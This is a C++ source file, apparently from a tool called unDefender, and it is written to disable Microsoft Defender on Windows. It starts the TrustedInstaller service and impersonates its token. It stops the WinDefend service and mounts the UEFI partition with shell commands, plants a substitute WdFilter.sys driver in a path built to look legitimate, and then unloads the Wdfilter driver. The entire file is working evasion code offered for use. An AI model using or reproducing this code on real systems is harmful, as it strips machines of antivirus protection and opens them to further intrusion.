#include "common.h"

NTSTATUS ImpersonateAndUnload()
{
#pragma region nt_imports
	// load NtDll and resolve the addresses of NtImpersonateThread() and NtUnloadDriver()
	RAII::Hmodule ntdllModule = LoadLibraryW(L"ntdll.dll");
	if (!ntdllModule.GetHmodule())
	{
		std::cout << "[-] Couldn't open a handle to ntdll! Error: 0x" << std::hex << GetLastError() << std::endl;
		return 1;
	}

	pNtImpersonateThread NtImpersonateThread = (pNtImpersonateThread)GetProcAddress(ntdllModule.GetHmodule(), "NtImpersonateThread");
	if (!NtImpersonateThread)
	{
		std::cout << "[-] Couldn't resolve NtImpersonateThread address! Error: 0x" << std::hex << GetLastError() << std::endl;
		return 1;
	}

	pNtUnloadDriver NtUnloadDriver = (pNtUnloadDriver)GetProcAddress(ntdllModule.GetHmodule(), "NtUnloadDriver");
	if (!NtUnloadDriver)
	{
		std::cout << "[-] Couldn't resolve NtUnloadDriver address! Error: 0x" << std::hex << GetLastError() << std::endl;
		return 1;
	}
#pragma endregion native Nt functions are imported through GetProcAddress

		// steps:
		// 1. start the trustedinstaller service & process
		// 2. steal the trustedinstaller process token
		// 3. impersonate TrustedInstaller's token
		// 4. unload Wdfilter

#pragma region impersonating_TrustedInstaller
	// step 1 - open the service manager, then start TrustedInstaller
	RAII::ScHandle svcManager = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
	if (!svcManager.GetHandle())
	{
		Error(GetLastError());
		return 1;
	}
	else std::cout << "[+] Opened handle to the SCM!\n";

	RAII::ScHandle trustedInstSvc = OpenServiceW(svcManager.GetHandle(), L"TrustedInstaller", SERVICE_START);
	if (!trustedInstSvc.GetHandle())
	{
		Error(GetLastError());
		std::cout << "[-] Couldn't get a handle to the TrustedInstaller service...\n";
		return 1;
	}
	else std::cout << "[+] Opened handle to the TrustedInstaller service!\n";

	auto success = StartServiceW(trustedInstSvc.GetHandle(), 0, nullptr);
	if (!success && GetLastError() != 0x420) // 0x420 is the error code returned when the service is already running
	{
		Error(GetLastError());
		std::cout << "[-] Couldn't start TrustedInstaller service...\n";
		return 1;
	}
	else std::cout << "[+] Successfully started the TrustedInstaller service!\n";

	auto trustedInstPid = FindPID(L"TrustedInstaller.exe");
	if (trustedInstPid == ERROR_FILE_NOT_FOUND)
	{
		std::cout << "[-] Couldn't find the TrustedInstaller process...\n";
		return 1;
	}

	auto trustedInstThreadId = GetFirstThreadID(trustedInstPid);
	if (trustedInstThreadId == ERROR_FILE_NOT_FOUND || trustedInstThreadId == 0)
	{
		std::cout << "[-] Couldn't find TrustedInstaller process' first thread...\n";
		return 1;
	}

	RAII::Handle hTrustedInstThread = OpenThread(THREAD_DIRECT_IMPERSONATION, false, trustedInstThreadId);
	if (!hTrustedInstThread.GetHandle())
	{
		std::cout << "[-] Couldn't open a handle to the TrustedInstaller process' first thread...\n";
		return 1;
	}
	else std::cout << "[+] Opened a THREAD_DIRECT_IMPERSONATION handle to the TrustedInstaller process' first thread!\n";

	// step 3 - impersonate the thread to get TrustedInstaller privilege for the current thread
	SECURITY_QUALITY_OF_SERVICE sqos = {};
	sqos.Length = sizeof(sqos);
	sqos.ImpersonationLevel = SecurityImpersonation;
	auto status = NtImpersonateThread(GetCurrentThread(), hTrustedInstThread.GetHandle(), &sqos);
	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully impersonated TrustedInstaller token!\n";
	else
	{
		Error(RtlNtStatusToDosError(status));
		std::cout << "[-] Failed to impersonate TrustedInstaller...\n";
		return 1;
	}
#pragma endregion current thread token now has TrustedInstaller privileges

#pragma region unloading_wdfilter
	// step 4 - set the SeLoadDriverPrivilege for the current thread and call NtUnloadDriver to unload Wdfilter
	HANDLE tempHandle;
	success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
	if (!success)
	{
		std::cout << "[-] Failed to open current thread token, exiting...\n";
		return 1;
	}
	RAII::Handle currentToken = tempHandle;
	
	success = SetPrivilege(currentToken.GetHandle(), L"SeLoadDriverPrivilege", true);
	if (!success) return 1;

	RAII::ScHandle winDefendSvc = OpenServiceW(svcManager.GetHandle(), L"WinDefend", SERVICE_ALL_ACCESS);
	if (!winDefendSvc.GetHandle())
	{
		Error(GetLastError());
		std::cout << "[-] Couldn't get a handle to the WinDefend service...\n";
		return 1;
	}
	else std::cout << "[+] Opened handle to the WinDefend service!\n";

	SERVICE_STATUS svcStatus;
	success = ControlService(winDefendSvc.GetHandle(), SERVICE_CONTROL_STOP, &svcStatus);
	if (!success)
	{
		Error(GetLastError());
		std::cout << "[-] Couldn't stop WinDefend service...\n";
		return 1;
	}
	else std::cout << "[+] Successfully stopped the WinDefend service! Sleeping 5 seconds...\n";

	Sleep(5000);

	// YES I KNOW IT'S SLOPPY BUT IT'S 5 AM AND THIS IS FAST.
	// make sure to put in the same folder unDefender.exe AND the provided WdFilter.sys (which is basically RwDrv.sys :)
	// this command sequence mounts the UEFI partition and creates a directory tree structure which mimicks the legit WdFilter path
	system("mountvol.exe U: /S");
	std::cout << "[!] ";
	system("mkdir U:\\Windows\\System32\\Drivers\\wd\\");
	std::cout << "[!] ";
	system("copy .\\legit.sys U:\\Windows\\System32\\Drivers\\wd\\WdFilter.sys /Y");
	system("mountvol.exe U: /D");

	success = StartServiceW(winDefendSvc.GetHandle(), 0, nullptr);
	if (!success)
	{
		Error(GetLastError());
		std::cout << "[-] Couldn't restart WinDefend service...\n";
		return 1;
	}
	else std::cout << "[+] Successfully restarted the WinDefend service! Sleeping 5 seconds...\n";

	Sleep(5000);

	UNICODE_STRING wdfilterDrivServ;
	RtlInitUnicodeString(&wdfilterDrivServ, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\Wdfilter");

	status = NtUnloadDriver(&wdfilterDrivServ);
	if (status == STATUS_SUCCESS) std::cout << "[+] Successfully unloaded Wdfilter!\n";
	else
	{
		Error(RtlNtStatusToDosError(status));
		std::cout << "[-] Failed to unload Wdfilter...\n";
	}
#pragma endregion Wdfilter is unloaded
	return status;
}